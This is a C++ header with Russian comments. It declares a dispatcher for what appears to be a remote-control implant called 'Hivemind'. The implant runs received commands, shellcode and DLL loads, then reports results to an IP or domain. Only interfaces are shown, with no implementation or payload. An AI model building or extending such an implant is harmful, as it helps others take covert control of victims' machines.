#pragma once

#include "global.hpp"
#include "NetChannel.hpp"
#include "protoparser.hpp"
#include "utils.hpp"
#include "strings.hpp"
#include "json_builder.hpp"
#include "modulesystem.hpp"

// таймаут ожидания выполнения операции
#define WAIT_FOR_DISPATCHER_TIMEOUT 10 * 1000

namespace dispatcher
{
	typedef struct _ophandler_argument
	{
		blob dataArg;
		blob cidArg;
		PWCHAR pwDomainName;
		PWCHAR pwIP;
		PWCHAR pwJsonSession;
		IModuleSystem *msystem;
		union additional_type // операция либо модуль либо команда
		{
			hivemind_module_type_t hmModuleType; // тип модуля
			hivemind_command_type_t hmCommandType; // тип команды
		} additional;
	} ophandler_argument, *pophandler_argument;

	VOID free_ophandler(pophandler_argument *arg);

	DWORD WINAPI CommandDispatcher(pophandler_argument arg);
	DWORD WINAPI ModuleDispatcher(pophandler_argument arg);

	BOOL SendCommandStatus(pophandler_argument arg, DWORD dwReturnCode, blob *pbResultData);

	VOID AppendDllLoaderStatus(JsonBuilder *jbuilder, DWORD dwReturnCode);
	VOID AppendShellcodeStatus(JsonBuilder *jbuilder, DWORD dwReturnCode);
	VOID AppendDExecStatus(JsonBuilder *jbuilder, DWORD dwReturnCode);
	VOID AppendCmdExecStatus(JsonBuilder *jbuilder, DWORD dwReturnCode);

	blob *base64decode(PCHAR pBase64);

}

class IOperationDispatcher
{
public:
	virtual ~IOperationDispatcher() = default;
	// выполняет то что распарсил proto_parser, если нужно отправляя результат на pwIP/pwDomainName
	// так как операция - многопоточная, то нужно копировать pwDomainName / pwIP / pwchSessionJson в новый буфер освобождая в конце потока, дабы не было крашей из-за недостаточного времени жизни
	// и только msystem не нужно копировать, так как обработка модулей - однопоток
	virtual BOOL dispatch(IProtocolParser *proto_parser, PWCHAR pwDomainName, PWCHAR pwIP, PWCHAR pwchSessionJson, IModuleSystem *msystem) = 0;
};

class HivemindOperationDispatcher : public IOperationDispatcher
{
public:
	HivemindOperationDispatcher();
	~HivemindOperationDispatcher();

	BOOL dispatch(IProtocolParser *proto_parser, PWCHAR pwDomainName, PWCHAR pwIP, PWCHAR pwchSessionJson, IModuleSystem *msystem);

};